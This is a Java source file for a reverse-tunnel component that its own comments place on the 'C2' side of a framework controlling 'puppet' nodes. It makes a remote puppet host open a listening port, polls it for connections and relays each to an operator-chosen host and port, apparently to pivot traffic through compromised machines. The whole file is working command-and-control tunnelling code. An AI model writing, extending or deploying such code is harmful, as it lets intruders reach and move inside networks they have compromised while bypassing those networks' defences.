package org.leo.core.engine.reverse;

import org.leo.core.engine.socks5.Socks5ProxyStatistics;
import org.leo.core.puppet.impl.JavaPuppetNode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * 反向隧道服务器（C2 侧）。
 *
 * 流程：
 *   1. 通过 invokeComponent 在 puppet 端开 ServerSocket 监听 remoteListenPort
 *   2. 启动 AcceptPollThread 周期性轮询 puppet 端的新连接
 *   3. 每个新连接由 dialerExecutor 异步在 C2 侧拨号到 forwardHost:forwardPort，
 *      并启动 ReverseReadThread / ReverseWriteThread 双向中继
 *
 * 类似 ssh -R remoteListenPort:forwardHost:forwardPort，方向与 LocalForward 相反。
 */
public class ReverseTunnelServer {

    private static final Logger logger = LoggerFactory.getLogger(ReverseTunnelServer.class);

    // 与 ReverseTunnelComponent 对齐
    static final int OP_START_LISTEN = 0;
    static final int OP_STOP_LISTEN  = 1;
    static final int OP_ACCEPT       = 2;
    static final int OP_READ         = 3;
    static final int OP_WRITE        = 4;
    static final int OP_CLOSE        = 5;

    private static final long DEFAULT_POLL_INTERVAL_MS = 150L;
    private static final int  DEFAULT_MAX_CONNS        = 200;

    private final JavaPuppetNode javaPuppetNode;
    private final String listenId;
    private final int remoteListenPort;
    private final String bindAddr;
    private final String forwardHost;
    private final int forwardPort;
    private final long pollIntervalMs;
    private final int maxConns;

    private volatile boolean running;
    private Thread pollThread;
    private ExecutorService dialerExecutor;
    private Runnable onDead;

    private final Socks5ProxyStatistics statistics;
    private final long startTime = System.currentTimeMillis();

    /** connId -> 本地 Socket（指向 forwardHost:forwardPort） */
    private final ConcurrentHashMap<String, Socket> localConns =
            new ConcurrentHashMap<String, Socket>();

    public ReverseTunnelServer(JavaPuppetNode javaPuppetNode,
                                int remoteListenPort,
                                String bindAddr,
                                String forwardHost,
                                int forwardPort) {
        this(javaPuppetNode, remoteListenPort, bindAddr, forwardHost, forwardPort, DEFAULT_POLL_INTERVAL_MS, DEFAULT_MAX_CONNS);
    }

    public ReverseTunnelServer(JavaPuppetNode javaPuppetNode,
                                int remoteListenPort,
                                String bindAddr,
                                String forwardHost,
                                int forwardPort,
                                long pollIntervalMs) {
        this(javaPuppetNode, remoteListenPort, bindAddr, forwardHost, forwardPort, pollIntervalMs, DEFAULT_MAX_CONNS);
    }

    public ReverseTunnelServer(JavaPuppetNode javaPuppetNode,
                                int remoteListenPort,
                                String bindAddr,
                                String forwardHost,
                                int forwardPort,
                                long pollIntervalMs,
                                int maxConns) {
        this.javaPuppetNode = javaPuppetNode;
        this.remoteListenPort = remoteListenPort;
        this.bindAddr = (bindAddr == null || bindAddr.length() == 0) ? "127.0.0.1" : bindAddr;
        this.forwardHost = forwardHost;
        this.forwardPort = forwardPort;
        this.pollIntervalMs = pollIntervalMs > 0 ? pollIntervalMs : DEFAULT_POLL_INTERVAL_MS;
        this.maxConns = maxConns > 0 ? maxConns : DEFAULT_MAX_CONNS;
        this.listenId = UUID.randomUUID().toString().replace("-", "");
        // 复用统计模型；port 字段填 puppet 侧监听端口
        this.statistics = new Socks5ProxyStatistics(remoteListenPort);
    }

    public String getListenId()        { return listenId; }
    public int getRemoteListenPort()   { return remoteListenPort; }
    public String getBindAddr()        { return bindAddr; }
    public String getForwardHost()     { return forwardHost; }
    public int getForwardPort()        { return forwardPort; }
    public boolean isRunning()         { return running; }
    public long getStartTime()         { return startTime; }
    public Socks5ProxyStatistics getStatistics() { return statistics; }

    /**
     * 注册"隧道死亡"回调。
     * 当 AcceptPollLoop 检测到 puppet 端 listenId 不再存在（404）时触发，
     * 由调用方（JavaPuppetNode）负责从 reverseTunnels map 中移除自身。
     */
    public void setOnDead(Runnable onDead) {
        this.onDead = onDead;
    }

    /**
     * 启动反向隧道：先在 puppet 端开监听，成功后再启动轮询线程。
     * 若后续初始化失败，主动 STOP_LISTEN 回滚，避免 puppet 端孤儿 ServerSocket。
     */
    public synchronized void start() throws Exception {
        if (running) return;

        Map<String, Object> params = new HashMap<String, Object>();
        params.put("op", Integer.valueOf(OP_START_LISTEN));
        params.put("listenId", listenId);
        params.put("listenPort", Integer.valueOf(remoteListenPort));
        params.put("bindAddr", bindAddr);
        Map<String, Object> res = javaPuppetNode.invokeComponent("ReverseTunnelComponent", params);
        Object code = res != null ? res.get("code") : null;
        if (!Integer.valueOf(200).equals(code)) {
            String msg = res != null ? String.valueOf(res.get("msg")) : "unknown";
            throw new RuntimeException("puppet START_LISTEN failed: " + msg);
        }

        // START_LISTEN 已成功，后续初始化若失败必须回滚
        try {
            running = true;
            dialerExecutor = Executors.newCachedThreadPool(new ThreadFactory() {
                private final AtomicInteger idx = new AtomicInteger();
                public Thread newThread(Runnable r) {
                    Thread t = new Thread(r, "ReverseTunnel-Dialer-" + remoteListenPort + "-" + idx.incrementAndGet());
                    t.setDaemon(true);
                    return t;
                }
            });

            pollThread = new Thread(new AcceptPollLoop(), "ReverseTunnel-Poll-" + remoteListenPort);
            pollThread.setDaemon(true);
            pollThread.start();
        } catch (Exception e) {
            // 回滚：让 puppet 端释放已绑定的端口
            running = false;
            if (dialerExecutor != null) {
                try { dialerExecutor.shutdownNow(); } catch (Exception ignored) {}
                dialerExecutor = null;
            }
            try {
                Map<String, Object> stopParams = new HashMap<String, Object>();
                stopParams.put("op", Integer.valueOf(OP_STOP_LISTEN));
                stopParams.put("listenId", listenId);
                javaPuppetNode.invokeComponent("ReverseTunnelComponent", stopParams);
            } catch (Exception rollbackEx) {
                logger.warn("start 回滚时 STOP_LISTEN 失败: {}", rollbackEx.getMessage());
            }
            throw e;
        }

        logger.info("反向隧道启动: puppet:{}:{} -> {}:{} (listenId={})",
                bindAddr, remoteListenPort, forwardHost, forwardPort, listenId);
    }

    /**
     * 停止反向隧道：先停轮询，再关 puppet 监听，最后清理本地连接。
     */
    public synchronized void stop() {
        if (!running) return;
        running = false;
        try { if (pollThread != null) pollThread.interrupt(); } catch (Exception ignored) {}

        try {
            Map<String, Object> params = new HashMap<String, Object>();
            params.put("op", Integer.valueOf(OP_STOP_LISTEN));
            params.put("listenId", listenId);
            javaPuppetNode.invokeComponent("ReverseTunnelComponent", params);
        } catch (Exception e) {
            logger.debug("STOP_LISTEN 调用异常: {}", e.getMessage());
        }

        // 关闭所有本地 socket
        for (Map.Entry<String, Socket> e : localConns.entrySet()) {
            try { e.getValue().close(); } catch (Exception ignored) {}
        }
        localConns.clear();

        if (dialerExecutor != null) {
            try { dialerExecutor.shutdownNow(); } catch (Exception ignored) {}
        }
        if (statistics != null) statistics.reset();
        logger.info("反向隧道停止: listenId={}", listenId);
    }

    JavaPuppetNode getJavaPuppetNode() { return javaPuppetNode; }
    ConcurrentHashMap<String, Socket> getLocalConns() { return localConns; }

    /**
     * accept 轮询线程。
     */
    private class AcceptPollLoop implements Runnable {
        public void run() {
            while (running) {
                try {
                    Map<String, Object> params = new HashMap<String, Object>();
                    params.put("op", Integer.valueOf(OP_ACCEPT));
                    params.put("listenId", listenId);
                    Map<String, Object> res = javaPuppetNode.invokeComponent("ReverseTunnelComponent", params);
                    Object code = res != null ? res.get("code") : null;
                    if (Integer.valueOf(200).equals(code)) {
                        Object newConnsObj = res.get("newConns");
                        if (newConnsObj instanceof List) {
                            List<?> newConns = (List<?>) newConnsObj;
                            if (!newConns.isEmpty()) {
                                List<Map<String, Object>> snapshot = new ArrayList<Map<String, Object>>();
                                for (Object o : newConns) {
                                    if (o instanceof Map) {
                                        snapshot.add((Map<String, Object>) o);
                                    }
                                }
                                for (Map<String, Object> info : snapshot) {
                                    final String connId = (String) info.get("connId");
                                    final String clientAddr = (String) info.get("clientAddr");
                                    if (connId == null) continue;
                                    if (localConns.size() >= maxConns) {
                                        // 超出连接数上限，通知 puppet 关闭该连接
                                        logger.warn("反向隧道连接数已达上限 {}, 拒绝新连接 connId={}", maxConns, connId);
                                        try {
                                            Map<String, Object> closeParams = new HashMap<String, Object>();
                                            closeParams.put("op", Integer.valueOf(OP_CLOSE));
                                            closeParams.put("connId", connId);
                                            javaPuppetNode.invokeComponent("ReverseTunnelComponent", closeParams);
                                        } catch (Exception ignored) {}
                                        continue;
                                    }
                                    dialerExecutor.submit(new DialerTask(ReverseTunnelServer.this, connId, clientAddr));
                                }
                            }
                        }
                    } else if (Integer.valueOf(404).equals(code)) {
                        logger.warn("反向隧道 listenId 在 puppet 端不存在，停止轮询: listenId={}", listenId);
                        running = false;
                        // 通知 JavaPuppetNode 从 reverseTunnels map 中自动移除
                        if (onDead != null) {
                            try { onDead.run(); } catch (Exception ignored) {}
                        }
                        break;
                    }
                } catch (Exception e) {
                    if (running) {
                        logger.debug("accept 轮询异常: {}", e.getMessage());
                    }
                }
                try {
                    Thread.sleep(pollIntervalMs);
                } catch (InterruptedException e) {
                    if (!running) break;
                }
            }
        }
    }
}
